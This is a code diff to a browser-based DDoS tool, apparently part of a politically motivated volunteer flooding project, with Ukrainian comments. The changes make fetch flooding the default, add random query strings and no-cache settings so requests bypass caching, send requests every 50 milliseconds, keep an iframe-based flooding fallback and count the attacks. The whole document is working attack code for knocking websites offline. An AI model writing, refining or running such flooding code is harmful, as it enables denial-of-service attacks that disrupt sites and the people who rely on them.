@@ -1,5 +1,25 @@
+const attackInterval = 200
+
+// Функції для керування документом
+function add_count () {
+    attacks.text(parseInt(attacks.text()) + 1);
+    (d => d.attacks ? d.attacks = parseInt(d.attacks) + 1 : d.attacks = 1)(Database)
+}
+
+function setTarget(target) {
+	if (target) {
+		targetField.text(target.page);
+	    methodField.text("GET");
+	    return true
+	};
+}
+
+
+const composeVictim = async target => `${target.page}?data=${getRandomArbitrary()}`;
+
+
 class Doser {
-    async start(isFetch=false) {
+    async start(isFetch=true) {
     	this.attack = true; // Статус атаки
 
         // Запуск атаки
@@ -7,7 +27,7 @@ class Doser {
         btn.text("Стоп");
         const target = await getTarget();
 
-        if (setTarget(target)) {
+        if (!setTarget(target)) {
         	// Якщо не завнтажились цілі
 
         	this.attack = false;
@@ -16,34 +36,29 @@ class Doser {
         };
         console.log(target);
 
-        this.interval /*Цикл DDoS-атаки*/ = setInterval(isFetch ? async () => {
-            // Запити
-
-            await fetch([target.page], {
-	            method: target.method,
+        this.interval = isFetch ? setInterval(async () => {
+        	await fetch([await composeVictim(target)], {
+	            method: "GET",
 	            mode: 'no-cors',
-				referrerPolicy: 'no-referrer'
+				referrerPolicy: 'no-referrer',
+				cache: 'no-cache',
+				expires: 0
 	        })
 	        .catch(()=>{})
 
 	        .then(() => {
 	            // Після запиту
-
-	            console.log("Ok!");
 	            add_count();
 	        })
-        } : async () => {
-
-        	const targett = await getSalt(target.page); // Беремо сіль з нашого Криму
-
+        }, 50) : setInterval(async () => {
         	// Надсилання запиту на сайт за допомогою елементу iframe
-        	await Frames.draw(targett);
-        	console.log(targett);
+
+        	await Frames.draw(target);
 
         	add_count();
 
         	if ($("#frames")[0].childElementCount >= 100) Frames.clear();
-        }, attackInterval);
+        }, attackInterval)
     };
     stop() {
     	if (this.interval) {
